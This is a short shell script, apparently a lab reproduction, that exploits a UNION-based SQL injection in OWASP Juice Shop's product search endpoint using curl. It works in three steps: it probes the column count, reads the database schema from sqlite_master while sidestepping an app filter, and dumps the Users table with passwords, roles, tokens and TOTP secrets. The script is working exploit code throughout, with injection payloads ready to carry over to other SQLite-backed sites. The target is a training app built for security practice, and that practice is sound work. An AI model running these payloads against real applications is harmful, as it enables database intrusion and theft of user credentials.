#!/bin/sh
# c05-sqli-union-dump :: raw-curl reproduction
# Target: OWASP Juice Shop (SQLite) - GET /rest/products/search?q=
set -e
B=http://host.docker.internal:3000/rest/products/search?q=

echo "[1] column count = 10 (error oracle)"
curl -s "$B=qwerty%27%29%29+UNION+SELECT+1,2,3,4,5,6,7,8,9,10--" | head -c 200; echo

echo "[2] schema disclosure via sqlite_master (note: 'tbl_name' literal is blocked by an app filter, 'name' works)"
curl -s "$B=qwerty%27%29%29+UNION+SELECT+1,name,4,5,6,7,8,9,10,sql+FROM+sqlite_master+WHERE+name=%27Users%27--" | head -c 600; echo

echo "[3] full Users table dump (UNION, 10 cols; 'lastLoginIp' name is filtered -> literal 7)"
curl -s "$B=qwerty%27%29%29+UNION+SELECT+id,username,email,password,role,deluxeToken,7,profileImage,totpSecret,isActive+FROM+Users--" \
  | python3 -c "import sys,json;[print(r['id'],r['description'],r['deluxePrice'],r['price']) for r in json.load(sys.stdin)['data']]"
